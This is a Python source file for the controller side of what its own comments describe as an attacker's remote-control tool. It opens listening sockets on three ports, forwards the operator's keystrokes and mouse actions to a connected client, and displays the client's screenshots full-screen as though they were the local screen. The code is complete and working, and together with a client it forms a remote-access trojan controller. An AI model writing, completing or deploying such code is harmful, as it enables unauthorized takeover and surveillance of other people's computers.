import time
import socket
import threading
import tkinter as tk
from tkinter import *
from io import BytesIO
from PIL import Image, ImageTk, ImageFile
from pynput.keyboard import Key
from pynput.keyboard import Listener  as KeyboardListener
from pynput.mouse import Listener  as MouseListener



def create_server(ip, port):
      # Creates a socket object for the server
      server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      server_socket.bind((ip, port)) # Define the IP + Port for the server
      server_socket.listen(5) # Define maximum amount ot connections waiting to be accepted
      print(f"Server listening on {ip}:{port}")
      return server_socket


def accept_client(server_socket):
    # Accepts an incoming connection request from a client
    client_socket, client_address = server_socket.accept()  
    print(f"Accepted client: {client_address}")  
    return client_socket



def keyboard_thread(client_keyboard_socket):

    '''
    A function that listens to the attacker's keyboard and contains functions within it to implement the listening.
    After a key is pressed, the function sends the key to the client.
    param client_keyboard_socket: The client's keyboard socket
    '''

    def on_press(key):
        # A key on the keyboard was pressed (not yet released)
        try:
            message = f"press,{key.char}\n"
        # If it's not a regular character key
        except AttributeError:
            message = f"press,{key.name}\n"
        client_keyboard_socket.send(message.encode('utf-8'))


    def on_release(key):
        # A previously pressed key has been released
        try:
            message = f"release,{key.char}\n"
        # If it's not a regular character key
        except AttributeError:
            message = f"release,{key.name}\n"
        client_keyboard_socket.send(message.encode('utf-8'))

    # Enabling a keyboard listener
    with KeyboardListener(on_press = on_press, on_release = on_release) as k_listener:
        k_listener.join()



def mouse_thread(client_mouse_socket):

    '''
    A function that listens to the attacker's mouse and contains functions to implement the listening.
    After clicking on one of the mouse sides or scrolling, the function sends the action taken to the client.
    param client_mouse_socket: The client's mouse socket
    '''

    def on_move(x, y):
        # In case of mouse movement
        client_mouse_socket.send('move,{0},{1}\n'.format(x, y).encode('utf-8'))

    def on_click(button, pressed):
        # In case of mouse click
        try:
             button_name = button.name  # "left", "right", "middle"
        except AttributeError:
            button_name = str(button)

        client_mouse_socket.send('click,{0},{1}\n'.format(button_name, int(pressed)).encode('utf-8'))     


    def on_scroll(dx, dy):
        # In the case of scrolling with the mouse
        client_mouse_socket.send('scroll,{0},{1}\n'.format(dx, dy).encode('utf-8'))

    # Enabling a mouse listener
    with MouseListener(on_move = on_move, on_click = on_click, on_scroll = on_scroll) as m_listener:
        m_listener.join()



def screen_thread(client_screen_socket):

    '''
    A function that receives real-time screenshots (ignoring image transition delays) of the computer screen from the
    client and displays them in a convenient GUI interface that changes the image on the screen every x amount of time
    to update what is happening on the remote computer.
    param client_screen_socket: The client's screen socket
    '''

    global current_image

    # In order that as many images as possible are displayed on the screen and can replace the image being displayed even if they are a little damaged
    ImageFile.LOAD_TRUNCATED_IMAGES = True

    while True:
        # Collects all the binary characters of the image each time
        screenShot_data = b''

        while True:
            data = client_screen_socket.recv(4096)
            # If data did not get any data
            if not data:
                break

            screenShot_data += data
            # If no more data
            if len(data) < 4096:
                break

        # If screenShot_data is not empty
        if screenShot_data:
            try:
                # Storing the binary characters that display the image on a buffer in the program's memory
                image_stream = BytesIO(screenShot_data) 
                screen_shot = Image.open(image_stream) # Open the image
                screen_shot = screen_shot.resize((1600, 900)) # Adjust as needed
                current_image = ImageTk.PhotoImage(screen_shot) # To be able to display the image in the GUI interface

            except Exception as e:
                print(f"Error opening image: {e}")

        time.sleep(0.06)



if __name__ == "__main__":

    # Creating the GUI
    gui = Tk(className = "Controling remote computer")
    gui.geometry("1600x900")
     # To make it look as if the image on our screen (screenshot of the remote computer) is our screen
    gui.attributes("-fullscreen", True)

    def toggle_fullscreen(event = None):
        # A function that helps the attacker control whether he wants the visual recording of the remote screen on his entire screen or not
        is_fullscreen = gui.attributes("-fullscreen")
        gui.attributes("-fullscreen", not is_fullscreen)

    gui.bind("<F11>", toggle_fullscreen) # When you want to exit full screen


    image1 = Image.open("H://NOY//אקדמיית המתכנתים//image1.png") # Open the first shown image of connecting to remote computer
    resized_image = image1.resize((1600, 900)) # Adjust as needed
    first_image = ImageTk.PhotoImage(resized_image) # To be able to display the image in the GUI interface
    # Creating a label on which the remote computer's screenshots will be displayed and exchanged
    remote_screen = Label(gui, image = first_image)
    remote_screen.pack()

    current_image = None

    def update_gui():
        # A function that switches between images on a gui after x amount of time
        if current_image:
            remote_screen.config(image = current_image)
            remote_screen.image = current_image  # Keep reference
        gui.after(22, update_gui)

    # Creating server sockets that will wait for client connections(The IP is '0.0.0.0' so they can receive any client that is on the network):

    # Creating a server socket to listen for the keyboard
    s_keyboard_socket = create_server('0.0.0.0', 55001)
    c_keyboard_socket = accept_client(s_keyboard_socket)
    # Creating a a keyboard listening thread that will run in the background (so as not to interfere with the interface)
    k_thread = threading.Thread(target = keyboard_thread, args = (c_keyboard_socket,), daemon = True)
    k_thread.start()

    # Creating a server socket to listen for the mouse
    s_mouse_socket = create_server('0.0.0.0', 55002)
    c_mouse_socket = accept_client(s_mouse_socket)
    # Creating a mouse listening thread that will run in the background (so as not to interfere with the interface)
    m_thread = threading.Thread(target = mouse_thread, args = (c_mouse_socket,), daemon = True)
    m_thread.start()

    # Creating a server socket to show remote computer screen
    s_screen_socket = create_server('0.0.0.0', 55003)
    c_screen_socket = accept_client(s_screen_socket)
    # Creating a thread to receive screenshots of the remote computer and display them, which will run in the background (so as not to interfere with the interface's work)
    s_thread = threading.Thread(target = screen_thread, args = (c_screen_socket,), daemon = True)
    s_thread.start()

    # Starting the function that updates images after x time until the first image is displayed
    gui.after(5000, update_gui)
    
    # Running the interface
    gui.mainloop()